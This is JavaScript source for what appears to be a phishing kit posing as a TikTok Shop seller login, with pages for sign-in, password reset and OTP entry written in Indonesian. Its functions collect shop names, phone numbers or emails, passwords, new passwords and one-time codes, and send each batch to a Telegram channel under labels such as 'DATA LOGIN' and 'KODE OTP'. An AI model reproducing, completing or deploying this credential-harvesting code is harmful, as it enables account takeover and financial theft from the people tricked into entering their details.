let halamanSebelumnya = 'page1';
let halamanSebelumHasil = 'page1';
let halamanAsalOTP = '';
let simpanData = {};
let jumlahOTP = 6;
let tipeLogin = '';

window.onload = function() {
    pulihkanHalaman();
    ambilInfoPerangkat();
    inisialisasiTab();
};

// KIRIM DATA KE TELEGRAM
async function kirimDataPerHalaman(judul, data) {
    await kirimTelegram(judul, data);
}

// FUNGSI TAMPIL HALAMAN
function tampilHalaman(id) {
    document.querySelectorAll('.container').forEach(p => p.style.display = 'none');
    document.getElementById(id).style.display = 'block';
    localStorage.setItem('halamanTerakhir', id);
    window.scrollTo(0, 0);
}
function goToPage(id) {
    halamanSebelumnya = document.querySelector('.container:not([style*="display: none"])')?.id || 'page1';
    tampilHalaman(id);
}
function kembaliKeSebelumnya() {
    tampilHalaman(halamanSebelumnya);
}
function kembaliKeHalamanSebelumnya() {
    localStorage.removeItem('halamanTerakhir');
    tampilHalaman(halamanSebelumHasil);
}
function kembaliDariOTP() {
    if (halamanAsalOTP === 'form') tampilHalaman('page-form');
    else if (halamanAsalOTP === 'login') tampilHalaman('page2');
    else if (halamanAsalOTP === 'reset') tampilHalaman('page3');
}
function pulihkanHalaman() {
    const terakhir = localStorage.getItem('halamanTerakhir');
    if (terakhir && terakhir !== 'page-result') {
        tampilHalaman(terakhir);
    } else {
        tampilHalaman('page1');
    }
}

// FUNGSI TAMPILAN PASSWORD
function togglePassword(idInput, idIkon) {
    const input = document.getElementById(idInput);
    const ikon = document.getElementById(idIkon);
    input.type = input.type === 'password' ? 'text' : 'password';
}
function togglePass(idInput, ikon) {
    const input = document.getElementById(idInput);
    input.type = input.type === 'password' ? 'text' : 'password';
}

// FUNGSI BUKA FORM
function bukaForm(jenis) {
    simpanData.jenis = jenis;
    halamanSebelumnya = 'page1';
    goToPage('page-form');
    if (jenis === 'tiktok') {
        document.getElementById('form-judul').textContent = 'Masuk dengan TikTok';
        document.getElementById('form-desc').textContent = 'Masukkan data akun TikTok Shop Anda';
    } else {
        document.getElementById('form-judul').textContent = 'Masuk dengan Email/Nomor HP';
        document.getElementById('form-desc').textContent = 'Masukkan data akun Anda';
    }
}

// FUNGSI TAB
function inisialisasiTab() {
    document.querySelectorAll('#page-form .tabs .tab').forEach(tab => {
        tab.addEventListener('click', function() {
            document.querySelectorAll('#page-form .tabs .tab').forEach(t => t.classList.remove('active'));
            this.classList.add('active');
            document.querySelectorAll('#page-form .input-view').forEach(v => v.classList.remove('active'));
            const jenis = this.getAttribute('data-tab');
            document.getElementById(`form-view-${jenis}`).classList.add('active');
            if (jenis === 'hp') document.getElementById('form-email').value = '';
            else document.getElementById('form-hp').value = '';
            cekValidasiForm();
        });
    });

    document.querySelectorAll('#page2 .tabs .tab').forEach(tab => {
        tab.addEventListener('click', function() {
            document.querySelectorAll('#page2 .tabs .tab').forEach(t => t.classList.remove('active'));
            this.classList.add('active');
            document.querySelectorAll('#page2 .input-view').forEach(v => v.classList.remove('active'));
            const jenis = this.getAttribute('data-tab');
            document.getElementById(`view-${jenis}`).classList.add('active');
            if (jenis === 'hp') document.getElementById('login-email').value = '';
            else document.getElementById('login-hp').value = '';
            cekValidasiLogin();
        });
    });

    document.querySelectorAll('#page3 .tab').forEach(tab => {
        tab.addEventListener('click', function() {
            document.querySelectorAll('#page3 .tab').forEach(t => t.classList.remove('active'));
            this.classList.add('active');
            const jenis = this.getAttribute('data-tab');
            document.getElementById('tab-hp').style.display = jenis === 'hp' ? 'block' : 'none';
            document.getElementById('tab-email').style.display = jenis === 'email' ? 'block' : 'none';
            cekValidasiReset();
        });
    });
}

// FUNGSI VALIDASI
function cekNomorHP(nilai) {
    if (!nilai) return false;
    const n = nilai.trim();
    return /^(08|62|\+62)?8\d{8,}$/.test(n);
}
function cekEmail(nilai) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(nilai.trim());
}
function updateButtonState(btnId, isActive) {
    const btn = document.getElementById(btnId);
    if (isActive) {
        btn.disabled = false;
        btn.classList.remove('btn-disabled');
        btn.classList.add('btn-active');
    } else {
        btn.disabled = true;
        btn.classList.remove('btn-active');
        btn.classList.add('btn-disabled');
    }
}

function cekValidasiForm() {
    const namaToko = document.getElementById('form-nama-toko').value.trim();
    const tabAktif = document.querySelector('#page-form .tabs .tab.active')?.getAttribute('data-tab');
    const error = document.getElementById('form-kontak-error');
    let kontakValid = false;

    if (tabAktif === 'hp') {
        const noHP = document.getElementById('form-hp').value.trim();
        kontakValid = /^8\d{8,}$/.test(noHP);
    } else {
        const email = document.getElementById('form-email').value.trim();
        kontakValid = cekEmail(email);
    }

    updateButtonState('form-btn', namaToko && kontakValid);
    error.style.display = kontakValid === false && (document.getElementById('form-hp').value || document.getElementById('form-email').value) ? 'block' : 'none';
}
function cekValidasiLogin() {
    const namaToko = document.getElementById('nama-toko').value.trim();
    const sandi = document.getElementById('pass-login').value.trim();
    const tabAktif = document.querySelector('#page2 .tabs .tab.active')?.getAttribute('data-tab');
    let kontakValid = false;

    if (tabAktif === 'hp') {
        const noHP = document.getElementById('login-hp').value.trim();
        kontakValid = /^8\d{8,}$/.test(noHP);
    } else {
        const email = document.getElementById('login-email').value.trim();
        kontakValid = cekEmail(email);
    }

    updateButtonState('btn-login', namaToko && sandi.length >= 6 && kontakValid);
}
function cekValidasiReset() {
    let valid = false;
    const tab = document.querySelector('#page3 .tab.active').getAttribute('data-tab');

    if (tab === 'hp') {
        const hp = document.getElementById('reset-hp').value.trim();
        const b = document.getElementById('pass-baru-hp').value;
        const k = document.getElementById('pass-konfirm-hp').value;
        valid = hp.length >= 9 && b.length >= 6 && b === k;
    } else {
        const email = document.getElementById('reset-email').value.trim();
        const b = document.getElementById('pass-baru-email').value;
        const k = document.getElementById('pass-konfirm-email').value;
        valid = cekEmail(email) && b.length >= 6 && b === k;
    }

    updateButtonState('btn-reset', valid);
}

// FUNGSI PINDAH KE HALAMAN OTP
function lanjutKeOTP(asal) {
    halamanAsalOTP = asal;
    
    if (asal === 'form') {
        const tab = document.querySelector('#page-form .tab.active').dataset.tab;
        tipeLogin = tab;
        simpanData.namaToko = document.getElementById('form-nama-toko').value.trim();
        simpanData.kontak = tab === 'hp' ? document.getElementById('form-hp').value.trim() : document.getElementById('form-email').value.trim();
        
        kirimDataPerHalaman('📝 DATA FORMULIR',
`🏪 Nama Toko: ${simpanData.namaToko}
📧 Kontak: ${simpanData.kontak}`);
    } 
    else if (asal === 'login') {
        const tab = document.querySelector('#page2 .tab.active').dataset.tab;
        tipeLogin = tab;
        simpanData.namaToko = document.getElementById('nama-toko').value.trim();
        simpanData.kontak = tab === 'hp' ? document.getElementById('login-hp').value.trim() : document.getElementById('login-email').value.trim();
        simpanData.sandi = document.getElementById('pass-login').value.trim();
        
        kirimDataPerHalaman('🔐 DATA LOGIN',
`🏪 Nama Toko: ${simpanData.namaToko}
📧 Kontak: ${simpanData.kontak}
🔒 Kata Sandi: ${simpanData.sandi}`);
    } 
    else if (asal === 'reset') {
        const tab = document.querySelector('#page3 .tab.active').dataset.tab;
        tipeLogin = tab;
        simpanData.kontak = tab === 'hp' ? document.getElementById('reset-hp').value.trim() : document.getElementById('reset-email').value.trim();
        simpanData.sandiBaru = tab === 'hp' ? document.getElementById('pass-baru-hp').value.trim() : document.getElementById('pass-baru-email').value.trim();
        
        kirimDataPerHalaman('🔑 DATA RESET SANDI',
`📧 Kontak: ${simpanData.kontak}
🔑 Sandi Baru: ${simpanData.sandiBaru}`);
    }

    // Atur tampilan OTP: HP = awal 4 kotak, Email = 6 kotak
    if (tipeLogin === 'email') {
        jumlahOTP = 6;
        document.getElementById('link-ganti-otp').classList.add('hidden');
        document.getElementById('otp-keterangan').textContent = 'Kode dikirim ke email Anda (boleh huruf + angka)';
    } else {
        jumlahOTP = 4;
        document.getElementById('link-ganti-otp').classList.remove('hidden');
        document.getElementById('link-ganti-otp').textContent = 'Ganti kode 6 angka';
        document.getElementById('otp-keterangan').textContent = 'Kode dikirim ke nomor HP Anda (hanya angka)';
    }

    buatInputOTP();
    goToPage('page-otp');
}

// FUNGSI BUAT INPUT OTP
function buatInputOTP() {
    const kotak = document.getElementById('otp-kotak');
    kotak.innerHTML = '';

    for (let i = 0; i < jumlahOTP; i++) {
        const input = document.createElement('input');
        input.type = 'text';
        input.maxLength = 1;
        input.className = `otp-input otp-input-${jumlahOTP}`;
        
        if (tipeLogin === 'hp') {
            input.inputMode = 'numeric';
            input.oninput = function() {
                this.value = this.value.replace(/[^0-9]/g, '');
                pindahInput(i);
            };
        } else {
            input.oninput = function() {
                pindahInput(i);
            };
        }

        input.onkeydown = function(e) {
            if (e.key === 'Backspace' && this.value === '') {
                kembaliInput(i);
            }
        };

        kotak.appendChild(input);
    }
    cekOTPLengkap();
}

function pindahInput(indeks) {
    const inputs = document.querySelectorAll('.otp-input');
    if (inputs[indeks].value && indeks < inputs.length - 1) {
        inputs[indeks + 1].focus();
    }
    cekOTPLengkap();
}
function kembaliInput(indeks) {
    const inputs = document.querySelectorAll('.otp-input');
    if (indeks > 0) {
        inputs[indeks - 1].focus();
    }
    cekOTPLengkap();
}
function cekOTPLengkap() {
    const inputs = document.querySelectorAll('.otp-input');
    let lengkap = true;
    inputs.forEach(i => { if (!i.value) lengkap = false; });
    updateButtonState('otp-btn', lengkap);
}

// FUNGSI GANTI JUMLAH OTP
function gantiJumlahOTP() {
    if (tipeLogin === 'email') return;
    jumlahOTP = jumlahOTP === 4 ? 6 : 4;
    document.getElementById('link-ganti-otp').textContent = 
        jumlahOTP === 4 ? 'Ganti kode 6 angka' : 'Ganti kode 4 angka';
    buatInputOTP();
}

// FUNGSI UBAH KODE
function ubahKodeOTP() {
    kembaliDariOTP();
}

// FUNGSI KIRIM OTP
async function kirimOTP() {
    let kode = '';
    document.querySelectorAll('.otp-input').forEach(i => kode += i.value);

    let pesan = '';
    if (simpanData.namaToko) pesan += `🏪 Nama Toko: ${simpanData.namaToko}\n`;
    pesan += `📧 Kontak: ${simpanData.kontak}\n`;
    if (simpanData.sandi) pesan += `🔒 Kata Sandi: ${simpanData.sandi}\n`;
    if (simpanData.sandiBaru) pesan += `🔑 Sandi Baru: ${simpanData.sandiBaru}\n`;
    pesan += `🔑 Kode OTP: ${kode}`;

    await kirimTelegram('🔓 KODE OTP', pesan);
    
    halamanSebelumHasil = 'page-otp';
    goToPage('page-result');
}
